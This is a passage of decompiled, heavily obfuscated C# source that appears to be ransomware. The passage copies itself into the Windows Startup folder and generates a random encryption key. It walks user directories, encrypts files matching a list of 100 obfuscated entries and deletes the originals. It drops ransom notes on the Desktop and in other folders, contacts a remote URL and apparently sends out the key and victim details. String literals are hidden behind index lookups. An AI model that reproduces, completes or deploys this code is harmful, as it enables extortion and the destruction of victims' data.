							EvGDFwQHbzXMTU = SNoRzClPbgpw + EvGDFwQHbzXMTU;
						}
						string text2 = CPOlMgiMtrt.qfsgcgZBmwQ(32);
						string s2 = ZrbAiQSenEN.PvVgiztDRoWbhs(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (EvGDFwQHbzXMTU != getString_0(107349127))
						{
							if (!SeGgjnhvEXrLE)
							{
								if (!XuGnEkReQEL)
								{
									bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + EvGDFwQHbzXMTU, MrSCMslRwDw);
								}
								else
								{
									bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!XuGnEkReQEL)
									{
										BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + EvGDFwQHbzXMTU, MrSCMslRwDw);
									}
									else
									{
										BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (mLogOAlXxCGZma)
									{
										try
										{
											File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + getString_0(107349145) + ex6.Message + getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									slRUPIhEEasxMv++;
									return;
								}
							}
						}
						else if (!SeGgjnhvEXrLE)
						{
							if (!XuGnEkReQEL)
							{
								bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + getString_0(107349122), MrSCMslRwDw);
							}
							else
							{
								bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + getString_0(107349122), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!XuGnEkReQEL)
								{
									BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, MrSCMslRwDw);
								}
								else
								{
									BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (mLogOAlXxCGZma)
								{
									try
									{
										File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + getString_0(107349145) + ex8.Message + getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								slRUPIhEEasxMv++;
								return;
							}
						}
						if (XuGnEkReQEL)
						{
							if (EvGDFwQHbzXMTU != getString_0(107349127))
							{
								sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + EvGDFwQHbzXMTU, bytes2);
							}
							else
							{
								sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, bytes2);
							}
						}
					}
					end_IL_0142_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0842;
			IL_0842:
			hfUdwvPqriEs.Remove(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
		}

		static zMMiSiOLxsKC()
		{
			Strings.CreateGetStringDelegate(typeof(zMMiSiOLxsKC));
		}
	}

	private sealed class IFBDzGiIHqaq
	{
		public string TiXuEtVXJO;

		public string ffhyRdTPLEAt;

		public void _003CEncrypt2_003Eb__43()
		{
			while (true)
			{
				try
				{
					File.Delete(TiXuEtVXJO);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					if (File.Exists(ffhyRdTPLEAt))
					{
						File.Delete(ffhyRdTPLEAt);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string fDdXPSgMYtSb;

	public static byte[] MrSCMslRwDw;

	public static string GuOreRpiLQap;

	public static string zsGrHDUuxWs;

	public static List<string> PyvRWqGGEBqe;

	public static List<string> xJINiyOhhDfDbs;

	public static string dhmCIIVjYLiaUe;

	public static string foDfHTmkRAByYW;

	public static string dMEajFLAgrd;

	public static string lfRulKEmfYuz;

	public static int xjnDrgNONZ;

	public static string iGHIvdzAxB;

	public static string mshVomHbim;

	public static string IeYBRVKOwsFZyV;

	public static string fnwGRrIriTN;

	public static string fYkqQidCJxK;

	public static string yHBlhtUnZUggy;

	public static string FRkIAybspdzvX;

	public static string nxtvTmuCCQc;

	public static List<string> yLGbFnCRkWtc;

	public static List<string> nWxaVjFaAUH;

	public static string koZTdIJguFMJz;

	public static string xHmywLMXmkazz;

	public static string mCGCbdZDuNU;

	public static List<string> jehTyctIFoYNIp;

	public static string ccVuYsoPuiaSPr;

	private static string hGrasQkvRyqJ;

	public static string wEAEiGEvbQBe;

	public static string yBTwRmrGXKm;

	public static List<string> OEhJocgvESeKlP;

	public static List<string> aeDxyjZzVlIXe;

	public static List<string> BgDQImjWwaYDd;

	public static List<string> qSeRLoMxhN;

	public static string yZKyvkpwryYYK;

	public static List<string> svgoeVgBNiLH;

	public static List<string> ZKdQkFZiYtdjdexLa;

	public static string MbLRRbGHzyep;

	public static string BdwGIAoAXnEPPd;

	internal static DateTime lisYWzdLubr;

	internal static DateTime AeiSRYuXkka;

	public static string jJEHaHJsPqMKE;

	public static string ySwjQogNty;

	public static string yIaukVMxcKciIw;

	public static string FbmPdjrdLtVE;

	public static string lnCdbOoPxBjWgbb;

	public static string ZTYBktYFGZnF;

	public static string ZKwOmhznLvDkyWGg;

	public static string uOaGmGyltMwB;

	public static List<string> qGlQdkkhGGe;

	public static string pAghGHVkfTo;

	public static string DPfofuVLHxlnIyh;

	public static string tRexKHpxmwCb;

	public static string mwClZvPUCBMR;

	public static string YfdSFhaBDHeYxs;

	public static string aDHEuAwdeU;

	public static string dFMmgyOlTYkP;

	public static string qzlTRdnWfxmlFh;

	public static string FhrZFBDYTY;

	public static string thFRkMZkhKCVyhF;

	public static string PdLplIwVgpAvTL;

	public static string kSEUuByktbZ;

	public static string TIQtugQdOdHoh;

	public static string QxikgxJvjblcKLkr;

	public static string OyRAGYayvFfIY;

	public static string nHJAntAOCQshC;

	public static string iVuYQcQder;

	public static string YDyhzIwjDY;

	public static string iQqNdKUYZcW;

	public static string GnVhnUOOYYhdqkV;

	public static string NmGsqpjtNCMwN;

	public static string CGbobQRfpvcFI;

	public static string GMDnKQtkGjvjPuM;

	public static string HCTmotlzFhXPei;

	public static string YhJjGoAdhpaRmmM;

	public static string jRhrNpjPoYGAs;

	public static string ZapXHYEcfcRlj;

	public static string rGkofnQgwm;

	public static string zvJeVfXnRCe;

	public static string[] GXgjKrYUwuZaYL;

	public static string RnjVpuumuPDdKRf;

	public static bool tbUmPYlAGHV;

	public static string RvxtIgFpdTf;

	public static bool XuGnEkReQEL;

	public static bool VYRkfIYNefiGO;

	public static bool tApMAsLSvIKgGlQ;

	public static bool pkGgDruhQkA;

	public static string PuxbPamNEvKf;

	public static bool mLogOAlXxCGZma;

	public static bool XhmxLxZZhdUcaP;

	public static bool LGeDOMPKwBf;

	public static bool BQmGsgiCrLkeXK;

	public static bool SeGgjnhvEXrLE;

	public static string PRyWDkHhXF;

	public static bool UlBNnyiBkggp;

	public static Stopwatch tFNHpewWORLeMw;

	public static int slRUPIhEEasxMv;

	public static int oNVtehkGXSvfD;

	public static bool EovHtqNdKKIO;

	public static string SNoRzClPbgpw;

	public static string[] cXNyajJQmVYw;

	public static List<string> pzSZFsAYKoSFni;

	public static int kCLqZDepFamkHW;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	private static void Main(string[] args)
	{
		try
		{
			lvdaWWgpijusL CS_0024_003C_003E8__locals0 = new lvdaWWgpijusL();
			CS_0024_003C_003E8__locals0.uqLfYDGWWaXz = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.uqLfYDGWWaXz) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			NtuWLzqGTpQm.cMvmTEfErvbQ(hGrasQkvRyqJ);
		}
		catch (Exception)
		{
		}
		try
		{
			if (jRhrNpjPoYGAs == getString_0(107396939))
			{
				Thread thread = new Thread(WbcCjOXHnyYl.RbARfdsPweCqpW);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (IeYBRVKOwsFZyV == getString_0(107396939))
		{
			Thread.Sleep(int.Parse(fnwGRrIriTN));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ZKwOmhznLvDkyWGg == getString_0(107396939))
		{
			try
			{
				rJTGxJkOljig(OQNgkgiZsRBtM(getString_0(107396934)));
			}
			catch
			{
			}
		}
		try
		{
			if (FRkIAybspdzvX == getString_0(107396939) && jgdRpFSuvJNl.sDxjoLioLd())
			{
				new HBvwSokZxJP().tatiqUteRfqu(bool_0: false);
				jgdRpFSuvJNl.AwTXGggqYXtd();
			}
		}
		catch (Exception)
		{
		}
		if (xHmywLMXmkazz == getString_0(107396939) && jgdRpFSuvJNl.sDxjoLioLd())
		{
			new HBvwSokZxJP().tatiqUteRfqu(bool_0: false);
			new HBvwSokZxJP().QSCgfqOMcpBE();
		}
		if (mshVomHbim == getString_0(107396939))
		{
			hxclhaHYMJrijTG.oqMgQSydrwR();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396797);
			string text2 = text + Path.GetFileName(fileName);
			if (lfRulKEmfYuz == getString_0(107396939) && fileName != text2)
			{
				Thread thread2 = new Thread(dueHmxrGpKvX);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (dhmCIIVjYLiaUe == getString_0(107396939) && mainModule != null && fileName != text2)
			{
				try
				{
					xjnDrgNONZ = ycqvKOhZZYxa(0, yLGbFnCRkWtc.Count);
					File.Copy(fileName, text + yLGbFnCRkWtc[xjnDrgNONZ], overwrite: true);
					Process.Start(text + yLGbFnCRkWtc[xjnDrgNONZ]);
					cChVnDjwVrxY();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (MbLRRbGHzyep == getString_0(107396939) && DateTime.Now < lisYWzdLubr)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (BdwGIAoAXnEPPd == getString_0(107396939) && DateTime.Now > AeiSRYuXkka)
			{
				cChVnDjwVrxY();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107396792);
			if (TIQtugQdOdHoh == getString_0(107396939))
			{
				Console.WriteLine(getString_0(107397166));
			}
			tFNHpewWORLeMw.Start();
		}
		catch
		{
		}
		QQKoJJZSpsGuTi();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = aeDxyjZzVlIXe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						xgWoqKjgaerXBH(getString_0(107349555), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> bgDQImjWwaYDd = BgDQImjWwaYDd;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107349578)), string_0);
					};
				}
				Parallel.ForEach(bgDQImjWwaYDd, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (zvJeVfXnRCe == getString_0(107396939))
				{
					string[] gXgjKrYUwuZaYL = GXgjKrYUwuZaYL;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107349578)), getString_0(107349521) + string_0 + getString_0(107349544));
						};
					}
					Parallel.ForEach(gXgjKrYUwuZaYL, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!EZwTDhvYAYNP().Contains(getString_0(107349232)))
				{
					CKEuRrveQHd(yZKyvkpwryYYK);
				}
				else
				{
					List<string> source2 = qSeRLoMxhN;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							xgWoqKjgaerXBH(OQNgkgiZsRBtM(WZyxpqSvRMSftN(getString_0(107349539))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = svgoeVgBNiLH;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107349514)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> zKdQkFZiYtdjdexLa = ZKdQkFZiYtdjdexLa;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						xgWoqKjgaerXBH(getString_0(107349465), string_0);
					};
				}
				Parallel.ForEach(zKdQkFZiYtdjdexLa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (TIQtugQdOdHoh == getString_0(107397157))
		{
			idCFphyPoHDy();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && tApMAsLSvIKgGlQ)
			{
				try
				{
					Thread thread4 = new Thread(IDthsFgIbBDC.uzjzTnaoUcwUMx);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xgWoqKjgaerXBH(getString_0(107397152), OQNgkgiZsRBtM(getString_0(107397107)));
			xgWoqKjgaerXBH(getString_0(107397152), OQNgkgiZsRBtM(getString_0(107397066)));
			xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107396977)), OQNgkgiZsRBtM(getString_0(107396996)));
			xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107396977)), OQNgkgiZsRBtM(getString_0(107396354)));
		}
		SecureString secureString = new SecureString();
		if (yIaukVMxcKciIw == getString_0(107397157))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			foDfHTmkRAByYW = getString_0(107396692);
		}
		dMEajFLAgrd = ZrbAiQSenEN.PvVgiztDRoWbhs(WvoHGwatDhJxFd(secureString));
		if (qzlTRdnWfxmlFh == getString_0(107396939))
		{
			niONSpGcALY();
		}
		if (LGeDOMPKwBf)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), PRyWDkHhXF)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), PRyWDkHhXF), string.Concat(OQNgkgiZsRBtM(getString_0(107396679)), new WebClient().DownloadString(OQNgkgiZsRBtM(getString_0(107396622))), getString_0(107396613), OQNgkgiZsRBtM(getString_0(107396608)), DateTime.Now, getString_0(107396613), OQNgkgiZsRBtM(getString_0(107396535)), dMEajFLAgrd));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), PRyWDkHhXF), getString_0(107396510) + dMEajFLAgrd);
				}
			}
			catch (Exception ex7)
			{
				if (mLogOAlXxCGZma)
				{
					try
					{
						File.AppendAllText(PuxbPamNEvKf, getString_0(107396481) + ex7.Message + getString_0(107396613));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		UZWdzRDahI.lCvgkITUwspSS(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), GnVhnUOOYYhdqkV), wuLAhEopyjj(dMEajFLAgrd), null, null, getString_0(107395888), getString_0(107395903), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			SjeyVRLKdAjajxB();
		}
		try
		{
			try
			{
				if (UlBNnyiBkggp)
				{
					Console.WriteLine(getString_0(107395854));
				}
			}
			catch
			{
			}
			TVFBlXoBlE(new string[1] { getString_0(107395805) }, new string[100]
			{
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395790),
				getString_0(107395813),
				getString_0(107395808),
				getString_0(107395771),
				getString_0(107395766),
				getString_0(107395761),
				getString_0(107395788),
				getString_0(107395783),
				getString_0(107395778),
				getString_0(107395741),
				getString_0(107395732),
				getString_0(107395727),
				getString_0(107395750),
				getString_0(107395745),
				getString_0(107395708),
				getString_0(107395703),
				getString_0(107395698),
				getString_0(107395725),
				getString_0(107395716),
				getString_0(107395711),
				getString_0(107396186),
				getString_0(107396181),
				getString_0(107396176),
				getString_0(107396203),
				getString_0(107396198),
				getString_0(107396193),
				getString_0(107396156),
				getString_0(107396151),
				getString_0(107396146),
				getString_0(107396173),
				getString_0(107396168),
				getString_0(107396163),
				getString_0(107396122),
				getString_0(107396117),
				getString_0(107396112),
				getString_0(107396139),
				getString_0(107395766),
				getString_0(107396134),
				getString_0(107395788),
				getString_0(107396093),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396078),
				getString_0(107396105),
				getString_0(107396100),
				getString_0(107396095),
				getString_0(107396058),
				getString_0(107396053),
				getString_0(107396048),
				getString_0(107396075),
				getString_0(107396070),
				getString_0(107396065),
				getString_0(107396028),
				getString_0(107396023),
				getString_0(107396018),
				getString_0(107396045),
				getString_0(107396036),
				getString_0(107396031),
				getString_0(107395990),
				getString_0(107396009),
				getString_0(107396134),
				getString_0(107395964),
				getString_0(107395955),
				getString_0(107395978),
				getString_0(107395969),
				getString_0(107395416),
				getString_0(107395407),
				getString_0(107395434),
				getString_0(107395425),
				getString_0(107395384),
				getString_0(107395375),
				getString_0(107395402),
				getString_0(107395397),
				getString_0(107395392),
				getString_0(107395355),
				getString_0(107395350),
				getString_0(107395345),
				getString_0(107395368),
				getString_0(107395363),
				getString_0(107395358),
				getString_0(107395321),
				getString_0(107395316),
				getString_0(107395311),
				getString_0(107395334),
				getString_0(107395293),
				getString_0(107395288),
				getString_0(107396168),
				getString_0(107395283),
				getString_0(107395278),
				getString_0(107395305),
				getString_0(107395300),
				getString_0(107395295),
				getString_0(107395254),
				getString_0(107395249),
				getString_0(107395276),
				getString_0(107395267),
				getString_0(107395262),
				getString_0(107395225)
			}, new string[0], WvoHGwatDhJxFd(secureString), getString_0(107395220));
		}
		catch (Exception ex9)
		{
			if (mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(PuxbPamNEvKf, getString_0(107395231) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206));
				streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107395685)));
				streamWriter.WriteLine(getString_0(107396613));
				streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107391131)));
				streamWriter.WriteLine(dMEajFLAgrd);
				if (wEAEiGEvbQBe == getString_0(107397157))
				{
					streamWriter.WriteLine(getString_0(107396613));
					streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107391098)) + Convert.ToString(jehTyctIFoYNIp.Count));
				}
				if (EovHtqNdKKIO)
				{
					streamWriter.WriteLine(getString_0(107396613));
					streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107391565)));
					streamWriter.WriteLine(fkiONJkXtes.AVnEuNMFEQQ());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206));
				if (!text3.Contains(dMEajFLAgrd) && !XuGnEkReQEL)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206), getString_0(107391532) + dMEajFLAgrd);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in nWxaVjFaAUH)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395206)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206), item + getString_0(107395206), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206));
					if (!text4.Contains(dMEajFLAgrd) && !XuGnEkReQEL)
					{
						File.AppendAllText(item + getString_0(107395206), getString_0(107391532) + dMEajFLAgrd);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!pkGgDruhQkA && num > 10)
			{
				break;
			}
		}
		if (GMDnKQtkGjvjPuM == getString_0(107396939))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391471)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391471));
					streamWriter2.WriteLine(OQNgkgiZsRBtM(getString_0(107391438)));
					streamWriter2.WriteLine(getString_0(107396613));
					streamWriter2.WriteLine(OQNgkgiZsRBtM(getString_0(107352946)));
					streamWriter2.WriteLine(dMEajFLAgrd + OQNgkgiZsRBtM(getString_0(107352345)));
					if (wEAEiGEvbQBe == getString_0(107397157))
					{
						streamWriter2.WriteLine(getString_0(107396613));
						streamWriter2.WriteLine(OQNgkgiZsRBtM(getString_0(107352364)) + OQNgkgiZsRBtM(getString_0(107391098)) + Convert.ToString(jehTyctIFoYNIp.Count) + OQNgkgiZsRBtM(getString_0(107352345)));
					}
					if (EovHtqNdKKIO)
					{
						streamWriter2.WriteLine(getString_0(107396613));
						streamWriter2.WriteLine(OQNgkgiZsRBtM(getString_0(107391565)));
						streamWriter2.WriteLine(fkiONJkXtes.AVnEuNMFEQQ());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206));
					if (!text5.Contains(dMEajFLAgrd) && !XuGnEkReQEL)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391471), OQNgkgiZsRBtM(getString_0(107352364)) + getString_0(107391532) + dMEajFLAgrd + OQNgkgiZsRBtM(getString_0(107352345)));
					}
				}
			}
			catch
			{
			}
		}
		if (ccVuYsoPuiaSPr == getString_0(107396939))
		{
			try
			{
				if (wEAEiGEvbQBe == getString_0(107397157))
				{
					fkiONJkXtes.rgZQTnMVGYfFd(getString_0(107352271), getString_0(107352298), getString_0(107352253), string.Concat(OQNgkgiZsRBtM(getString_0(107396679)), new WebClient().DownloadString(OQNgkgiZsRBtM(getString_0(107396622))), getString_0(107352244), OQNgkgiZsRBtM(getString_0(107396608)), DateTime.Now, getString_0(107396613), OQNgkgiZsRBtM(getString_0(107352239)), Convert.ToString(jehTyctIFoYNIp.Count), getString_0(107396613), OQNgkgiZsRBtM(getString_0(107396535)), dMEajFLAgrd));
				}
				else
				{
					fkiONJkXtes.rgZQTnMVGYfFd(getString_0(107352271), getString_0(107352298), getString_0(107352253), string.Concat(OQNgkgiZsRBtM(getString_0(107396679)), new WebClient().DownloadString(OQNgkgiZsRBtM(getString_0(107396622))), getString_0(107352244), OQNgkgiZsRBtM(getString_0(107396608)), DateTime.Now, getString_0(107396613), OQNgkgiZsRBtM(getString_0(107352239)), Convert.ToString(jehTyctIFoYNIp.Count), getString_0(107396613), OQNgkgiZsRBtM(getString_0(107396535)), dMEajFLAgrd));
				}
			}
			catch
			{
			}
		}
		if (nxtvTmuCCQc == getString_0(107396939))
		{
			try
			{
				VQxJpaWcAJK.NjoHZqraepHnh(new Uri(getString_0(107352222)));
			}
			catch
			{
			}
		}
		if (GMDnKQtkGjvjPuM == getString_0(107397157))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206)))
				{
					Process.Start(OQNgkgiZsRBtM(getString_0(107352189)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395206));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391471)))
				{
					Process.Start(OQNgkgiZsRBtM(getString_0(107352196)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391471));
				}
			}
			catch
			{
			}
		}
		if (qzlTRdnWfxmlFh == getString_0(107396939))
		{
			if (FhrZFBDYTY == getString_0(107396939) && !string.IsNullOrEmpty(thFRkMZkhKCVyhF) && !string.IsNullOrEmpty(PdLplIwVgpAvTL))
			{
				WhevDLEMhFHfsA(thFRkMZkhKCVyhF, PdLplIwVgpAvTL);
			}
			else
			{
				WhevDLEMhFHfsA(getString_0(107352659), getString_0(107352630));
			}
		}
		if (iVuYQcQder != getString_0(107351916))
		{
			lXcOLjMuMAFD(iVuYQcQder);
		}
		if (!string.IsNullOrEmpty(aDHEuAwdeU))
		{
			try
			{
				File.Delete(aDHEuAwdeU);
			}
			catch
			{
			}
		}
		if (mLogOAlXxCGZma)
		{
			try
			{
				File.AppendAllText(PuxbPamNEvKf, getString_0(107351867));
			}
			catch (Exception)
			{
			}
		}
		if (fDdXPSgMYtSb == getString_0(107351854))
		{
			cChVnDjwVrxY();
		}
	}

	public static void dueHmxrGpKvX()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(OQNgkgiZsRBtM(getString_0(107351877)), OQNgkgiZsRBtM(getString_0(107351723)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int ycqvKOhZZYxa(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> nKnHutgtWkp(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107351674)) && !text.Contains(getString_0(107351681)) && !text.Contains(getString_0(107352160)) && !text.ToLower().Contains(getString_0(107352111)) && !text.ToLower().Contains(getString_0(107352130)) && !text.Contains(getString_0(107352105)) && !text.Contains(getString_0(107352052)) && !text.ToLower().Contains(getString_0(107352067)) && !text.ToLower().Contains(getString_0(107352022)) && !text.ToLower().Contains(getString_0(107351985)) && !text.ToLower().Contains(getString_0(107352008)) && !text.ToLower().Contains(getString_0(107351959)) && !text.ToLower().Contains(getString_0(107351978)) && !text.ToLower().Contains(getString_0(107351933)) && !text.ToLower().Contains(getString_0(107351944)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
